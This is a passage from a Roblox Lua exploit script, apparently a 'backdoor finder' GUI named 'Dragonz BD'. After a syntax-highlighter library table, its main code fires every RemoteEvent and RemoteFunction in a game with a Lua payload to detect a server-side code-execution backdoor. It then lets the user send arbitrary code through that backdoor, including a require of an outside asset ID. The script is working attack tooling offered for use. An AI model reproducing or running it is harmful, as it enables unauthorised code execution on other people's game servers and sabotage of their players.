		},

		debug = {
			dumpheap = "function",
			info = "function",
			loadmodule = "function",
			profilebegin = "function",
			profileend = "function",
			resetmemorycategory = "function",
			setmemorycategory = "function",
			traceback = "function",
		},

		math = {
			abs = "function",
			acos = "function",
			asin = "function",
			atan2 = "function",
			atan = "function",
			ceil = "function",
			clamp = "function",
			cos = "function",
			cosh = "function",
			deg = "function",
			exp = "function",
			floor = "function",
			fmod = "function",
			frexp = "function",
			ldexp = "function",
			log10 = "function",
			log = "function",
			max = "function",
			min = "function",
			modf = "function",
			noise = "function",
			pow = "function",
			rad = "function",
			random = "function",
			randomseed = "function",
			round = "function",
			sign = "function",
			sin = "function",
			sinh = "function",
			sqrt = "function",
			tan = "function",
			tanh = "function",

			huge = "number",
			pi = "number",
		},

		os = {
			clock = "function",
			date = "function",
			difftime = "function",
			time = "function",
		},

		string = {
			byte = "function",
			char = "function",
			find = "function",
			format = "function",
			gmatch = "function",
			gsub = "function",
			len = "function",
			lower = "function",
			match = "function",
			pack = "function",
			packsize = "function",
			rep = "function",
			reverse = "function",
			split = "function",
			sub = "function",
			unpack = "function",
			upper = "function",
		},

		table = {
			clear = "function",
			clone = "function",
			concat = "function",
			create = "function",
			find = "function",
			foreach = "function",
			foreachi = "function",
			freeze = "function",
			getn = "function",
			insert = "function",
			isfrozen = "function",
			maxn = "function",
			move = "function",
			pack = "function",
			remove = "function",
			sort = "function",
			unpack = "function",
		},

		utf8 = {
			char = "function",
			codepoint = "function",
			codes = "function",
			graphemes = "function",
			len = "function",
			nfcnormalize = "function",
			nfdnormalize = "function",
			offset = "function",

			charpattern = "string",
		},

		Axes = {
			new = "function",
		},

		BrickColor = {
			Black = "function",
			Blue = "function",
			DarkGray = "function",
			Gray = "function",
			Green = "function",
			new = "function",
			New = "function",
			palette = "function",
			Random = "function",
			random = "function",
			Red = "function",
			White = "function",
			Yellow = "function",
		},

		CatalogSearchParams = {
			new = "function",
		},

		CFrame = {
			Angles = "function",
			fromAxisAngle = "function",
			fromEulerAngles = "function",
			fromEulerAnglesXYZ = "function",
			fromEulerAnglesYXZ = "function",
			fromMatrix = "function",
			fromOrientation = "function",
			lookAt = "function",
			new = "function",

			identity = "CFrame",
		},

		Color3 = {
			fromHex = "function",
			fromHSV = "function",
			fromRGB = "function",
			new = "function",
			toHSV = "function",
		},

		ColorSequence = {
			new = "function",
		},

		ColorSequenceKeypoint = {
			new = "function",
		},

		DateTime = {
			fromIsoDate = "function",
			fromLocalTime = "function",
			fromUniversalTime = "function",
			fromUnixTimestamp = "function",
			fromUnixTimestampMillis = "function",
			now = "function",
		},

		DockWidgetPluginGuiInfo = {
			new = "function",
		},

		Enum = {},

		Faces = {
			new = "function",
		},

		FloatCurveKey = {
			new = "function",
		},

		Font = {
			fromEnum = "function",
			fromId = "function",
			fromName = "function",
			new = "function",
		},

		Instance = {
			new = "function",
		},

		NumberRange = {
			new = "function",
		},

		NumberSequence = {
			new = "function",
		},

		NumberSequenceKeypoint = {
			new = "function",
		},

		OverlapParams = {
			new = "function",
		},

		PathWaypoint = {
			new = "function",
		},

		PhysicalProperties = {
			new = "function",
		},

		Random = {
			new = "function",
		},

		Ray = {
			new = "function",
		},

		RaycastParams = {
			new = "function",
		},

		Rect = {
			new = "function",
		},

		Region3 = {
			new = "function",
		},

		Region3int16 = {
			new = "function",
		},

		RotationCurveKey = {
			new = "function",
		},

		task = {
			cancel = "function",
			defer = "function",
			delay = "function",
			desynchronize = "function",
			spawn = "function",
			synchronize = "function",
			wait = "function",
		},

		TweenInfo = {
			new = "function",
		},

		UDim = {
			new = "function",
		},

		UDim2 = {
			fromOffset = "function",
			fromScale = "function",
			new = "function",
		},

		Vector2 = {
			new = "function",

			one = "Vector2",
			xAxis = "Vector2",
			yAxis = "Vector2",
			zero = "Vector2",
		},

		Vector2int16 = {
			new = "function",
		},

		Vector3 = {
			fromAxis = "function",
			FromAxis = "function",
			fromNormalId = "function",
			FromNormalId = "function",
			new = "function",

			one = "Vector3",
			xAxis = "Vector3",
			yAxis = "Vector3",
			zAxis = "Vector3",
			zero = "Vector3",
		},

		Vector3int16 = {
			new = "function",
		},
	},
}

local enumLibraryTable = language.libraries.Enum

for _, enum in ipairs(Enum:GetEnums()) do
	enumLibraryTable[tostring(enum)] = "Enum"
end

return language
end;
};
local function C_c()
local script = CryLol["c"];
	local Highlighter = require(script.Highlighter)
	
	Highlighter.highlight({
		textObject=script.Parent,
	})
	
	textbox=script.Parent
	textbox.InputChanged:Connect(function()
		if textbox.Text~='' then
			textbox.TextTransparency=1
			return
		end
		textbox.TextTransparency=0
	end)
end;
task.spawn(C_c);
local function C_15()
local script = CryLol["15"];
	local UIS = game:GetService("UserInputService")
	dragToggle = nil
	local dragSpeed = 0.4
	dragInput = nil
	dragStart = nil
	local dragPos = nil
	function updateInput(input)
		local Delta = input.Position - dragStart
		local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
		game:GetService("TweenService"):Create(script.Parent.Main, TweenInfo.new(0.15), {Position = Position}):Play()
	end
	script.Parent.Main.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
			dragToggle = true
			dragStart = input.Position
			startPos = script.Parent.Main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	script.Parent.Main.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
	
	
	
	GUI=script.Parent.Main
	
	alphabetwnums={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','1','2','3','4','5','6','7','8','9','0'}
	
	backdoor=nil
	HttpService=game:GetService("HttpService")
	
	function debug(text, lvl)
		local func=print
		if lvl==1 then func=print end
		if lvl==2 then func=error end
		if lvl==3 then func=warn end
		func('Dragonz : '..text)
	end
	
	function runRemote(remote, data, data2)
		if remote:IsA('RemoteEvent') then
			remote:FireServer(data)
		elseif remote:IsA('RemoteFunction') then
			spawn(function() remote:InvokeServer(data) end)
		end
	
	end
	
	function makeVisible(folder, state)
		for i,v in folder:GetDescendants() do
			if v:IsA('Frame') then 
				v.Visible=state
			end
		end
	end
	
	function notify(text)
		game:GetService('StarterGui'):SetCore(
			"SendNotification",
			{
				Title = "Dragonz BD",
				Duration = 6,
				Icon = "http://www.roblox.com/asset/?id=95040856564792",
				Text = text
			}
		)
	end
	
	makeVisible(GUI, false)
	GUI.FindBD.Visible=true
	GUI.Visible=true
	
	function generateName(lenght)
	
		local text=''
	
		for i=1,lenght do
			text=text..alphabetwnums[math.random(1,#alphabetwnums)]
		end
	
		return text
	
	end
	
	local code
	function findRemote()
	
		local timee=os.clock()
	
		local remotes={}
	
		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
			while true do
				code=generateName(math.random(50,100))
				if not remotes[code] then break end
			end
			spawn(function() protected_backdoor:InvokeServer(backdoor, "a=Instance.new('Folder',workspace)a.Name='"..code.."'") end)
			remotes[code]=protected_backdoor
		end
	
		for i,remote in game:GetDescendants() do
	
			if not remote:IsA('RemoteEvent') then 
				if not remote:IsA('RemoteFunction') then continue end
			end
	
			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
				debug('Roblox Replicated Storage ('..remote.Name..')', 1)
				continue
			end
	
			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
	
				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
					debug('Adonis filter detected ('..remote.Name..')', 1)
					continue
				end
	
				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
					debug('HD Admin ('..remote.Name..')', 1)
					continue
				end
	
				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
					debug('Chat event ('..remote.Name..')', 1)
					continue
				end
	
			end
	
			while true do
				code=generateName(math.random(12,30))
				if not remotes[code] then break end
			end
	
			runRemote(remote, "a=Instance.new('Folder',workspace)a.Name='"..code.."'")
			remotes[code]=remote
	
			debug('Sended Backdoor ? '..remote:GetFullName()..' ?', 1)
	
		end
	
		for i=1,100 do
			for i,remote in remotes do
				local code=i
				if workspace:FindFirstChild(code) then
					notify('Backdoor founded!')
					backdoor=remote
					debug(remote:GetFullName(), 3)
					GUI.Execute.Visible=true
					GUI.FindBD.Visible=false
					GUI.clr.Visible=true
					GUI.R6.Visible=true
					GUI.Exe.Visible=true
	
					return true
				end
			end
	
			wait()
	
		end
	
		return false
	
	end
	
	GUI.Exe.MouseButton1Click:Connect(function()
		local a,b=string.gsub(GUI.Execute.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
	
		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
			debug('Protected backdoor founded', 3)
			spawn(function()
				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer(backdoor, a) end)
				if variantValue~=nil then
					local splited=string.split(variantValue,':')
					notify(splited[#splited])
				end
			end)
		else
			runRemote(backdoor, a)
		end
	end)
	GUI.clr.MouseButton1Click:Connect(function()
		GUI.Execute.TextBox.Text=''
	end)
	
	searching=false
	
	GUI.FindBD.MouseButton1Click:Connect(function()
		if not searching then
			searching=true
			GUI.FindBD.Text='Wait'
			debug('Scanning', 3)
			if not findRemote() then
				notify('no backdoor ;(')
				GUI.FindBD.Text='No backdoor ;('
				wait(2)
				GUI.FindBD.Text='Find Backdoor :3'
				searching=false
			end
		end
	end)
	
	local r6 = string.format([[require(82202011916932).DrBuR6("%s", "Heck Yeah")]], game.Players.LocalPlayer.Name)
	GUI.R6.MouseButton1Click:Connect(function()
		runRemote(backdoor, r6)
	end)
	
	local t = game:GetService("TweenService")
	
	script.Parent["Open close"].Open.MouseButton1Click:Connect(function()
		t:Create(script.Parent.Main,TweenInfo.new(.5,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut),{Position=UDim2.new(0.299, 0,0.275, 0)}):Play()
		t:Create(script.Parent["Open close"],TweenInfo.new(.5,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut),{Position=UDim2.new(-1, 0,0.382, 0)}):Play()
	end)
	
	script.Parent.Main.close.MouseButton1Click:Connect(function()
		t:Create(script.Parent.Main,TweenInfo.new(.5,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut),{Position=UDim2.new(0.299, 0,1, 0)}):Play()
		t:Create(script.Parent["Open close"],TweenInfo.new(.5,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut),{Position=UDim2.new(0, 0,0.382, 0)}):Play()
	end)
end;
task.spawn(C_15);
local textlabelsss = Instance.new("TextLabel", CryLol["1"])
textlabelsss.TextScaled = true
textlabelsss.Text = "Dragonz BD  was inspired by Lalol Hub"
textlabelsss.Size = UDim2.new(0,200,0,50)
textlabelsss.Position = UDim2.new(0.415062755, 0, 0.0301659126, 0)
local textlabelssss = Instance.new("TextLabel", textlabelsss)
textlabelssss.TextScaled = true
textlabelssss.Text = [[Made By TeamCry]]
textlabelssss.Size = UDim2.new(0,200,0,25)
textlabelssss.Position = UDim2.new(6.28662092e-05, 0, 1.12033176, 0)
local function pppp()
	local localscriptssss = Instance.new("LocalScript", textlabelsss)
	wait(5)
	localscriptssss.Parent:Destroy()
end
coroutine.wrap(pppp)()

return CryLol["1"], require;
